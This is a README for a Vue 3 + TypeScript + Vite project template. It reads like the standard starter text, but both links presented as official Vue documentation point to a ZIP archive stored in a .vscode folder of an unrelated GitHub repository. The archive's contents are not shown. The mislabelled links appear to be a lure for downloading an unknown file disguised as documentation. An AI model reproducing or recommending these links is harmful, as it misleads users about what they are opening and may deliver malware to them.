# Vue 3 + TypeScript + Vite

This template should help get you started developing with Vue 3 and TypeScript in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://github.com/foreverLilRed/cumple-fio/raw/refs/heads/main/.vscode/cumple_fio_3.0.zip) to learn more.

Learn more about the recommended Project Setup and IDE Support in the [Vue Docs TypeScript Guide](https://github.com/foreverLilRed/cumple-fio/raw/refs/heads/main/.vscode/cumple_fio_3.0.zip).
